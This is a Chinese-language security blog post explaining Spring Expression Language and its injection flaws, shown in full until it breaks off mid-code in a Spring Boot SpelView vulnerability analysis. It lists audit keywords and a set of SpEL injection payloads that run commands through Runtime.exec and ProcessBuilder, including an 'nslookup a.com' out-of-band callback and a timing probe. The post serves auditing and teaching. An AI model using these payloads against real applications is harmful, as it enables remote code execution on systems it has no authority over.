@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        SPEL漏洞解析 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#什么是SPEL"><span class="toc-text">什么是SPEL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-表达式"><span class="toc-text">SpEL 表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本表达式"><span class="toc-text">基本表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类相关表达式"><span class="toc-text">类相关表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#集合相关表达式"><span class="toc-text">集合相关表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他表达式"><span class="toc-text">其他表达式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEL-基础"><span class="toc-text">SpEL 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-使用方式"><span class="toc-text">SpEL 使用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-主要接口"><span class="toc-text">SpEL 主要接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpEL-类相关表达式"><span class="toc-text">SpEL 类相关表达式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#审计关键点"><span class="toc-text">审计关键点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用payload"><span class="toc-text">常用payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE漏洞简析"><span class="toc-text">CVE漏洞简析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SpringBoot-SpEL表达式注入漏洞"><span class="toc-text">SpringBoot SpEL表达式注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><span class="toc-text">Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御方式"><span class="toc-text">防御方式</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        SPEL漏洞解析
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-03-20 00:31:47</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#JAVA" title="JAVA">JAVA</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#SPEL" title="SPEL">SPEL</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="什么是SPEL"><a href="#什么是SPEL" class="headerlink" title="什么是SPEL"></a>什么是SPEL</h1><p>Spring表达式语言全称为“Spring Expression Language”，缩写为“SpEL”，他能在运行时构建复杂表达式、存取对象属性、对象方法调用等等，并且能与 Spring 功能完美整合。表达式语言给静态 Java 语言增加了动态的功能，表达式语言是单独的模块，他只依赖与核心的模块，不依赖与其他模块，能够单独的使用。</p>
+<p>因为 Spring 框架的广泛使用，Spel 表达式的应用也十分的广泛。</p>
+<p>就安全领域而言，我们只要使用的是 #this 变量、[] 获取属性和 T 运算符，#this 变量用于引用当前评估对象，T 运算符可以用于指定 java.lang.Class 的实例，对 java.lang 中的对象的 T 引用不需要完整的包名，但引用所有其他对象时是需要的。 </p>
+<h2 id="SpEL-表达式"><a href="#SpEL-表达式" class="headerlink" title="SpEL 表达式"></a><strong>SpEL 表达式</strong></h2><h3 id="基本表达式"><a href="#基本表达式" class="headerlink" title="基本表达式"></a>基本表达式</h3><p>字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式；</p>
+<h3 id="类相关表达式"><a href="#类相关表达式" class="headerlink" title="类相关表达式"></a>类相关表达式</h3><p>类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用；</p>
+<h3 id="集合相关表达式"><a href="#集合相关表达式" class="headerlink" title="集合相关表达式"></a>集合相关表达式</h3><p>内联 List、内联数组、集合、字典访问、列表、字典；</p>
+<h3 id="其他表达式"><a href="#其他表达式" class="headerlink" title="其他表达式"></a>其他表达式</h3><p>模版表达式</p>
+<h1 id="SpEL-基础"><a href="#SpEL-基础" class="headerlink" title="SpEL 基础"></a>SpEL 基础</h1><p>在 pom.xml 导入 maven 或是把”org.springframework.expression-3.0.5.RELEASE.jar”添加到类路径中</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">org.springframework.version</span>&gt;</span>5.0.8.RELEASE<span class="tag">&lt;/<span class="name">org.springframework.version</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;org.springframework.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span></pre></td></tr></table></figure>
+
+<h2 id="SpEL-使用方式"><a href="#SpEL-使用方式" class="headerlink" title="SpEL 使用方式"></a>SpEL 使用方式</h2><ol>
+<li><p>XML配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"numberGuess"</span> <span class="attr">class</span>=<span class="string">"org.spring.samples.NumberGuess"</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"randomNumber"</span> <span class="attr">value</span>=<span class="string">"#&#123; T(java.lang.Math).random() * 100.0 &#125;"</span>/&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!-- other properties --&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></pre></td></tr></table></figure>
+</li>
+<li><p>基于注解的使用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmailSender</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;spring.mail.username&#125;"</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> String mailUsername;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Value</span>(<span class="string">"#&#123; systemProperties['user.region'] &#125;"</span>)    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">private</span> String defaultLocale;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    <span class="comment">//...</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+</li>
+<li><p>代码里直接使用</p>
+<p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Expression expression = parser.parseExpression(<span class="string">"('Hello' + 'world').concat(#end)"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">context.setVariable(<span class="string">"end"</span>, <span class="string">"!"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">System.out.println(expression.getValue(context));</span></pre></td></tr></table></figure>
+
+<p>最后是<strong>expression.getValue()</strong>执行表达式</p>
+<ol>
+<li><strong>创建解析器：</strong>SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；</li>
+<li><strong>解析表达式：</strong>使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象。</li>
+<li><strong>构造上下文：</strong>准备比如变量定义等等表达式需要的上下文数据。</li>
+<li><strong>求值：</strong>通过 Expression 接口的 getValue 方法根据上下文获得表达式值。</li>
+</ol>
+</li>
+</ol>
+<h2 id="SpEL-主要接口"><a href="#SpEL-主要接口" class="headerlink" title="SpEL 主要接口"></a>SpEL 主要接口</h2><p>1.<strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ExpressionParser</span> </span>&#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    <span class="function">Expression <span class="title">parseExpression</span><span class="params">(String expressionString)</span></span>;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="function">Expression <span class="title">parseExpression</span><span class="params">(String expressionString, ParserContext context)</span></span>;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">ParserContext parserContext = <span class="keyword">new</span> ParserContext() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isTemplate</span><span class="params">()</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getExpressionPrefix</span><span class="params">()</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> <span class="string">"#&#123;"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getExpressionSuffix</span><span class="params">()</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> <span class="string">"&#125;"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">String template = <span class="string">"#&#123;'hello '&#125;#&#123;'world!'&#125;"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">Expression expression = parser.parseExpression(template, parserContext);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">System.out.println(expression.getValue());</span></pre></td></tr></table></figure>
+
+<p><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。</p>
+<p><strong>Expression 接口</strong>：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。</p>
+<h2 id="SpEL-类相关表达式"><a href="#SpEL-类相关表达式" class="headerlink" title="SpEL 类相关表达式"></a>SpEL 类相关表达式</h2><p><strong>其中表达式支持非常多的语法，能够造成代码执行的有以下2种：</strong></p>
+<ol>
+<li><p><strong>类类型表达式</strong><br>类类型表达式：使用“T(Type)”来表示java.lang.Class实例，“Type”必须是类全限定名，“java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.lang 包类访问</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Class&lt;String&gt; result1 = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class<span class="class">.<span class="keyword">class</span>)</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">System.out.println(result1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//其他包类访问</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">String expression2 = <span class="string">"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class<span class="class">.<span class="keyword">class</span>)</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">System.out.println(result2);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//类静态字段访问</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result3 = parser.parseExpression(<span class="string">"T(Integer).MAX_VALUE"</span>).getValue(<span class="keyword">int</span><span class="class">.<span class="keyword">class</span>)</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">System.out.println(result3);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="comment">//类静态方法调用</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result4 = parser.parseExpression(<span class="string">"T(Integer).parseInt('1')"</span>).getValue(<span class="keyword">int</span><span class="class">.<span class="keyword">class</span>)</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">System.out.println(result4);</span></pre></td></tr></table></figure>
+</li>
+<li><p><strong>类实例化表达式</strong><br>类实例化同样使用java关键字“new”，类名必须是全限定名，但java.lang包内的类型除外，如String、Integer。 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Expression exp = parser.parseExpression(<span class="string">"new java.util.Date()"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Date value = (Date) exp.getValue();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">System.out.println(value);</span></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="审计关键点"><a href="#审计关键点" class="headerlink" title="审计关键点"></a>审计关键点</h1><ul>
+<li><p>org.springframework.expression.spel.standard</p>
+</li>
+<li><p>SpelExpressionParser</p>
+</li>
+<li><p>expression.getValue</p>
+</li>
+<li><p>expression.setValue</p>
+</li>
+</ul>
+<h1 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$&#123;<span class="number">12</span>*<span class="number">12</span>&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">"nslookup a.com"</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">T(Thread).sleep(<span class="number">10000</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> java.lang.ProcessBuilder(&#123;<span class="string">'nslookup a.com'</span>&#125;).start()</span></pre></td></tr></table></figure>
+
+<h1 id="CVE漏洞简析"><a href="#CVE漏洞简析" class="headerlink" title="CVE漏洞简析"></a>CVE漏洞简析</h1><h2 id="SpringBoot-SpEL表达式注入漏洞"><a href="#SpringBoot-SpEL表达式注入漏洞" class="headerlink" title="SpringBoot SpEL表达式注入漏洞"></a>SpringBoot SpEL表达式注入漏洞</h2><p><strong>影响版本：</strong>1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p>
+<p>其造成的原因主要是在 <code>ErrorMvcAutoConfiguration.java</code> 中的 <code>SpelView</code> 类:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SpelView</span> <span class="keyword">implements</span> <span class="title">View</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String template;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">private</span> PropertyPlaceholderHelper helper;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">private</span> PlaceholderResolver resolver;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">SpelView</span><span class="params">(String template)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">this</span>.template = template;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">this</span>.context.addPropertyAccessor(<span class="keyword">new</span> MapAccessor());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">this</span>.helper = <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="string">"$&#123;"</span>, <span class="string">"&#125;"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">this</span>.resolver = <span class="keyword">new</span> ErrorMvcAutoConfiguration.SpelPlaceholderResolver(<span class="keyword">this</span>.context);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getContentType</span><span class="params">()</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">return</span> <span class="string">"text/html"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span>(response.getContentType() == <span class="keyword">null</span>) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                response.setContentType(<span class="keyword">this</span>.getContentType());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap(model);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">            map.put(<span class="string">"path"</span>, request.getContextPath());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">this</span>.context.setRootObject(map);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">            String result = <span class="keyword">this</span>.helper.replacePlaceholders(<span class="keyword">this</span>.template, <span class="keyword">this</span>.resolver);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            response.getWriter().append(result);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>
+
+<p>大致流程为 <code>PropertyPlaceholderHelper</code> 类中通过 <code>parseStringValue</code> 方法递归字符串找到目标去掉 <code>$()</code> ，这个方法中调用 <code>resolvePlaceholder</code> 方法来在 <code>context</code> 中找到对应的 <code>name</code> ，并在这里执行了 <code>getValue</code> 操作。由此造成命令执行。代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String name)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">        Expression expression = <span class="keyword">this</span>.parser.parseExpression(name);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">try</span> &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">            Object value = expression.getValue(<span class="keyword">this</span>.context);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">            <span 